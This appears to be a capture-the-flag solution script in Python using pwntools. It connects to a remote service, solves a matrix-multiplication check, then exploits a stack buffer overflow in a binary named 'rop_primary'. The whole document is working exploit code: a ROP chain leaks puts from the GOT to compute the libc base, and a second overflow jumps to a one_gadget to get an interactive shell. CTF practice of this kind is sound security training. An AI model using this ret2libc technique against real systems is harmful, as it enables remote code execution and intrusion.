from pwn import * 
import numpy as np 

context.log_level = 'debug'
# sh = process('./rop_primary')
sh = remote('159.75.104.107', 30372)

sh.recvuntil('A:\n')
MatrixA = sh.recvuntil('B:\n', drop = True).split('\n')
MatrixA.pop()
for i in range(len(MatrixA)):
    MatrixA[i] = MatrixA[i].split()
    MatrixA[i] = map(int, MatrixA[i])

MatrixB = sh.recvuntil('a * b = ?\n', drop = True).split('\n')
MatrixB.pop()
for i in range(len(MatrixB)):
    MatrixB[i] = MatrixB[i].split()
    MatrixB[i] = map(int, MatrixB[i])

# print(MatrixA)
# print(MatrixB)

M_A = np.array(MatrixA)
M_B = np.array(MatrixB)
M_C = np.dot(M_A, M_B)

Ans = ''

for i in range(len(M_C)):
    for j in range(len(M_C[i])):
        # print(str(M_C[i][j])),
        Ans += str(M_C[i][j]) + ' '
    if (i != len(M_C) - 1):
        Ans += '\n'
# log.success(Ans)
sh.send(Ans)

puts_addr = 0x401040
pop_rdi = 0x0000000000401613
pop_rsi_r15 = 0x0000000000401611
puts_got = 0x404020
puts_offset = 0x0875a0
pop_r12_r13_r14_r15 = 0x000000000040160c
payload = 'a' * 0x38 + p64(pop_rdi) + p64(puts_got) + p64(puts_addr) + p64(0x401255)
sh.sendlineafter('try your best\n', payload)


libcbase = u64(sh.recv(6).ljust(8, '\x00')) - puts_offset
log.success('libcbase: ' + hex(libcbase))
one = [0xe6c7e, 0xe6c81, 0xe6c84]
payload = 'a' * 0x38 + p64(pop_r12_r13_r14_r15) + p64(0) * 4 + p64(one[0] + libcbase)
sh.sendlineafter('try your best\n', payload)

sh.interactive()